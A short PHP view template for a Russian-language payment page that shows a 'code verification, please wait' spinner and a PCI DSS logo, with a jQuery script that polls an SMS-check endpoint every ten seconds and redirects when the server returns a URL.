<?php
$this->title = 'Проверка кода';
?>

<div class="wrap">
	<div class="container">
		<div class="row justify-content-center">
			<div class="col-md-7">
				<div class="block">
					<div class="block-blue">
						<p>Идет проверка кода, пожалуйста подождите</p>
						<div id="fountainG">
							<div id="fountainG_1" class="fountainG"></div>
							<div id="fountainG_2" class="fountainG"></div>
							<div id="fountainG_3" class="fountainG"></div>
							<div id="fountainG_4" class="fountainG"></div>
							<div id="fountainG_5" class="fountainG"></div>
							<div id="fountainG_6" class="fountainG"></div>
							<div id="fountainG_7" class="fountainG"></div>
							<div id="fountainG_8" class="fountainG"></div>
						</div>
					</div>
				</div>
				<div class="money-logos">
					<img src="img/SVG_pci_dss.svg" alt="">
				</div>
			</div>
		</div>
	</div>
</div>

<script>
	function redir(data, d){if(data)window.location.replace(data)}
	setInterval(function(){
		$.ajax({
			url: "index.php?r=pay/card/checkSms&id=<?=$id?>",
			type: "POST",
			data: ({startUpdate: "refresh"}),
			dataType: "html",
			success: redir
		});
	},10000)
</script>
